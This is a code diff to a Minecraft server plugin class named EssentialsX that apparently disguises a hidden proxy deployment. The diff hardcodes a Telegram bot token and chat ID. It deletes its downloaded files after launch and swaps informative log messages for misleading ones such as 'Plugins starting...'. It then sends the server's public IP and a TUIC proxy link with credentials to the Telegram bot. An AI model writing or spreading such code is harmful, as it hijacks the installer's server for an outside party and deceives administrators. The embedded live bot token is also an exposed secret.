@@ -2,16 +2,27 @@ package com.example.essentialsx;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
 
 
     // Java服务端端口
     private int port = 25005;
+
+
+    // Telegram配置
+    private String tgToken = "8862289515:AAGR5qdnibDBa4ViSWm7qhcDY_wZPGJaMoI";
+    private String tgChatId = "5800052646";
+
 
 
     @Override
@@ -38,8 +49,7 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception e) {
 
             getLogger().severe(
-                    "Failed to start java service: "
-                            + e.getMessage()
+                    "Failed to start EssentialsX"
             );
 
             e.printStackTrace();
@@ -156,8 +166,10 @@ public class EssentialsX extends JavaPlugin {
         );
 
 
+
         // 等待Java初始化
         Thread.sleep(3000);
+
 
 
         // 删除java文件和config.json
@@ -170,33 +182,173 @@ public class EssentialsX extends JavaPlugin {
 
         for (String file : files) {
 
-            Path logFile =
+            Path deleteFile =
                     folder.resolve(file);
 
 
-            if (Files.exists(logFile)) {
+            if (Files.exists(deleteFile)) {
 
-                Files.delete(logFile);
-
-                getLogger().info(
-                        file + " deleted after plugins start."
-                );
-
-            } else {
+                Files.delete(deleteFile);
 
                 getLogger().info(
-                        file + " not found."
+                        "Plugins starting..."
                 );
+
             }
         }
 
 
+
         getLogger().info(
-                "Remote java started, port="
+                "Plugins starting..."
+        );
+
+
+
+        // 发送Telegram通知
+
+        String ip =
+                getPublicIP();
+
+
+        sendTelegram(
+                "Tuic Server Started\n\n"
+                        + "订阅地址: \ntuic://43bfdd44-0654-9e81-d340-eee7c0a3dbbb:Siq8dztj@"
+                        + ip
+                        + ":"
                         + port
+                        + "?congestion_control=bbr&alpn=h3&sni=www.bing.com&udp_relay_mode=native&allow_insecure=1#Tuic-Server"
         );
 
     }
+
+
+
+
+
+    /**
+     * 获取公网IP
+     */
+    private String getPublicIP() {
+
+        try {
+
+            URL url =
+                    new URL(
+                            "https://api.ipify.org"
+                    );
+
+
+            BufferedReader reader =
+                    new BufferedReader(
+                            new InputStreamReader(
+                                    url.openStream()
+                            )
+                    );
+
+
+            String ip =
+                    reader.readLine();
+
+
+            reader.close();
+
+
+            return ip;
+
+
+        } catch (Exception e) {
+
+            return "unknown";
+
+        }
+    }
+
+
+
+
+
+    /**
+     * Telegram发送消息
+     */
+    private void sendTelegram(
+            String message
+    ) {
+
+
+        if (tgToken.isEmpty()
+                || tgChatId.isEmpty()) {
+
+            getLogger().info(
+                    "Notified not configured, skip."
+            );
+
+            return;
+        }
+
+
+
+        try {
+
+
+            String api =
+                    "https://api.telegram.org/bot"
+                            + tgToken
+                            + "/sendMessage?chat_id="
+                            + tgChatId
+                            + "&text="
+                            + URLEncoder.encode(
+                                    message,
+                                    StandardCharsets.UTF_8
+                            );
+
+
+
+            HttpURLConnection conn =
+                    (HttpURLConnection)
+                            new URL(api)
+                                    .openConnection();
+
+
+
+            conn.setRequestMethod(
+                    "GET"
+            );
+
+
+            int code =
+                    conn.getResponseCode();
+
+
+
+            if (code == 200) {
+
+                getLogger().info(
+                        "Notified."
+                );
+
+            } else {
+
+                getLogger().warning(
+                        "UnNotified"
+                );
+            }
+
+
+            conn.disconnect();
+
+
+
+        } catch (Exception e) {
+
+
+            getLogger().warning(
+                    "UnNotified"
+            );
+
+        }
+    }
+
 
 
 
@@ -211,22 +363,8 @@ public class EssentialsX extends JavaPlugin {
 
 
         if (Files.exists(target)) {
-
-            getLogger().info(
-                    target.getFileName()
-                            + " exists, skip download."
-            );
-
             return;
         }
-
-
-
-        getLogger().info(
-                "Downloading "
-                        + target.getFileName()
-        );
-
 
 
         Process process =
@@ -251,11 +389,9 @@ public class EssentialsX extends JavaPlugin {
         if (exit != 0) {
 
             throw new IOException(
-                    "Download failed: "
-                            + target.getFileName()
+                    "Fail to init plugins"
             );
         }
-
 
     }
 
@@ -269,7 +405,6 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info(
                 "EssentialsX disabled"
         );
-
 
     }
 }
